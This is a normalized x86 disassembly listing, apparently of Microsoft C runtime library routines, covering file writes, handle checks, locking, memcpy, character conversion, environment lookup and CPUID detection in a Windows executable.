inc eax
inc [ ebp - 0x5c ]
mov al [ ebp - 0x55 ]
test al al
jne r-xdata
call sub_41108a
mov [ eax ] esi
push 0x0
lea eax [ ebp - 0x6c ]
push eax
mov eax edi
sub eax esi
push eax
lea eax [ ebp + esi + 0x108 ]
push eax
mov eax [ ebp - 0x70 ]
mov eax [ eax ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x50 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x50 ] 0x152
jb r-xdata
mov [ eax ] 0xd
add eax esi
add [ ebp - 0x50 ] esi
mov eax [ ebp - 0x6c ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
mov edi [ ebp - 0x70 ]
mov [ eax ] dx
inc eax
inc eax
inc esi
inc esi
cmp esi 0x3ff
jb r-xdata
add [ ebp - 0x68 ] 0x2
mov [ eax ] 0xd
inc eax
inc eax
inc esi
inc esi
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
jb r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
cmp al 0x1
je r-xdata
mov al [ esi ]
xor ecx ecx
cmp al 0xa
sete cl
movsx eax al
push eax
mov [ ebp - 0x78 ] ecx
call sub_41b8b3
test eax eax
pop ecx
jne r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x54 ] eax
add esi [ ebp - 0x6c ]
cmp edi esi
jg r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
mov eax [ ebp - 0x50 ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
jb r-xdata
cmp ecx [ ebp + 0x528 ]
jae r-xdata
jmp r-xdata
movzx ecx [ esi ]
xor edx edx
cmp cx 0xa
sete dl
inc esi
inc esi
add [ ebp - 0x5c ] 0x2
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x74 ] esi
mov [ ebp - 0x78 ] edx
cmp al 0x2
jne r-xdata
mov eax [ ebp - 0x64 ]
sub eax esi
add eax [ ebp + 0x528 ]
cmp eax 0x1
jbe r-xdata
push 0x1
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_41c20a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x5c ]
sub eax [ ebp - 0x64 ]
cmp eax [ ebp + 0x528 ]
mov [ ebp - 0x60 ] eax
jb r-xdata
jmp r-xdata
jmp r-xdata
push [ ebp - 0x54 ]
call sub_41d2f6
cmp ax [ ebp - 0x54 ]
pop ecx
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x2
lea eax [ ebp - 0x54 ]
push esi
push eax
call sub_41c20a
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
jmp r-xdata
cmp edi esi
jg r-xdata
inc [ ebp - 0x60 ]
cmp [ ebp - 0x78 ] 0x0
je r-xdata
mov eax [ ebp + 0x528 ]
cmp [ ebp - 0x5c ] eax
jb r-xdata
inc esi
inc [ ebp - 0x5c ]
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp + 0x50c ]
push ecx
push 0x1
lea ecx [ ebp - 0x54 ]
push ecx
push eax
push [ ebp - 0x7c ]
inc esi
inc [ ebp - 0x5c ]
mov [ ebp - 0x74 ] esi
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x54 ] eax
call sub_41d2f6
cmp ax [ ebp - 0x54 ]
pop ecx
jne r-xdata
mov esi [ ebp - 0x74 ]
jmp r-xdata
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push esi
lea eax [ ebp + 0x50c ]
push eax
mov eax [ edi ]
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc [ ebp - 0x60 ]
inc [ ebp - 0x68 ]
mov eax [ ebp - 0x50 ]
add [ ebp - 0x60 ] eax
cmp eax esi
jl r-xdata
cmp [ ebp - 0x78 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x50 ]
push eax
push 0x1
lea eax [ ebp + 0x50c ]
push eax
mov eax [ edi ]
mov [ ebp + 0x50c ] 0xd
push [ ebx + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x50 ] 0x1
jl r-xdata
inc [ ebp - 0x68 ]
inc [ ebp - 0x60 ]
jmp r-xdata
sub_41b3c7
push 0x10
push r--data
call sub_4106dc
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_41108a
and [ eax ] 0x0
call sub_411077
mov [ eax ] 0x9
call sub_41108a
mov [ eax ] edi
call sub_411077
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_413fad
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_410721
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
imul esi esi 0x28
mov ecx [ ebx ]
movzx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41d234
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_411077
mov [ eax ] 0x9
call sub_41108a
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41ae01
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b499
mov eax [ ebp - 0x1c ]
sub_41b4a3
inc [ rw-data ]
push 0x1000
call sub_417499
test eax eax
pop ecx
mov ecx [ esp + 0x4 ]
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_41b4e7
mov eax [ esp + 0x4 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_411077
mov [ eax ] 0x9
xor eax eax
retn
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_413fad
add esp 0x14
xor eax eax
pop esi
retn
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
imul eax eax 0x28
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
movzx eax [ ecx + eax + 0x4 ]
and eax 0x40
pop esi
retn
sub_41b54b
mov eax [ rw-data ]
test eax eax
push esi
push 0x14
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_4174d9
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_4174d9
test eax eax
pop ecx
pop ecx
mov [ rw-data ] eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov edi edx
and edi 0x1f
imul edi edi 0x28
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_41b61c
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_4141fc
pop ecx
retn
sub_41b64b
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_4141fc
pop ecx
retn
sub_41b66e
mov eax [ esp + 0x4 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
cmp eax rw-data
ja r-xdata
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_414124
pop ecx
retn
sub_41b69d
mov eax [ esp + 0x4 ]
cmp eax 0x14
jge r-xdata
mov eax [ esp + 0x8 ]
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
retn
add eax 0x10
push eax
call sub_414124
pop ecx
retn
sub_41b6c0
mov eax [ esp + 0x4 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
pop esi
retn
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_41b703
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
push edi
mov edi [ ebp + 0x10 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_411077
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_413fad
add esp 0x14
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
cmp ax 0xff
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_411077
mov [ eax ] 0x2a
call sub_411077
cmp [ ebp - 0x4 ] bl
mov eax [ eax ]
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_411077
push 0x22
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_413fad
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_4109d0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_4109d0
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41b87d
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41b8d0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_41b965
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
call sub_415558
xor ebx ebx
cmp [ rw-data ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] ebx
jne r-xdata
mov eax [ rw-data ]
mov esi [ ebp - 0x10 ]
cmp eax esi
je r-xdata
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x4 ]
push [ rw-data ]
call sub_415561
pop ecx
call eax
push eax
call sub_415561
pop ecx
call eax
cmp eax ebx
mov [ ebp - 0x4 ] eax
je r-xdata
push eax
call sub_415561
pop ecx
call eax
cmp eax ebx
je r-xdata
push eax
call sub_4154f5
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_4154f5
mov [ esp ] r--data
push edi
mov [ rw-data ] eax
call esi
push eax
call sub_4154f5
mov [ rw-data ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_413016
test eax eax
pop ecx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_41304d
test eax eax
pop ecx
je r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
push 0xc
lea ecx [ ebp - 0x20 ]
push ecx
push 0x1
push eax
push [ rw-data ]
call sub_415561
pop ecx
call eax
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
push [ ebp - 0x4 ]
push eax
call sub_415561
pop ecx
call eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x4
jb r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_413eb1
add esp 0x14
test [ ebp - 0x18 ] 0x1
jne r-xdata
push r--data
push edi
call esi
push eax
call sub_4154f5
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
or [ ebp + 0x10 ] 0x40000
jmp r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
push r--data
push edi
call esi
push eax
call sub_4154f5
pop ecx
mov [ rw-data ] eax
sub_41bb03
mov ecx [ esp + 0x4 ]
push esi
xor esi esi
cmp ecx esi
jl r-xdata
call sub_411077
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_413fad
add esp 0x14
or eax 0xffffffff
pop esi
retn
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
pop esi
retn
cmp ecx 0x3
jne r-xdata
mov eax [ rw-data ]
pop esi
retn
sub_41bb49
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_4110bb
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_41b87d
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_41c7d9
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_41bbff
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41bc86
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_41bc86
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_41bbff
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41bd76
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_4108e0
mov esi eax
inc esi
push esi
call sub_40f80e
test eax eax
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
retn 0x4
push [ ebx ]
push esi
push eax
call sub_410677
add esp 0xc
jmp r-xdata
sub_41bdc4
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_4108e0
mov edi eax
inc edi
push edi
call sub_40f80e
test eax eax
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_410677
add esp 0xc
jmp r-xdata
sub_41be5c
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41be7c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40f589
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_41bec1
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_41bec1
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_41be7c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41bf71
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_41bf90
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_41bf68
push ebx
push ecx
mov ebx rw-data
jmp r-xdata
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41bf71
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_41bfe3
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_41bf93
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_41c050
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
test esi esi
push ebx
push edi
jne r-xdata
xor eax eax
pop esi
retn
mov ebx [ esp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ rw-data ] esi
je r-xdata
xor eax eax
push ebx
call sub_4108e0
pop ecx
mov edi eax
jmp r-xdata
call sub_41d6e1
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_4108e0
cmp eax edi
pop ecx
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push ebx
push eax
call sub_41d6ca
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
pop ebx
pop esi
retn
sub_41c0f7
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_4110bb
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_41b87d
test eax eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov [ eax ] bx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_411077
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] bl
mov eax [ eax + 0xac ]
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41c23c
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
cmp [ rw-data ] ebx
push edi
mov esi ecx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
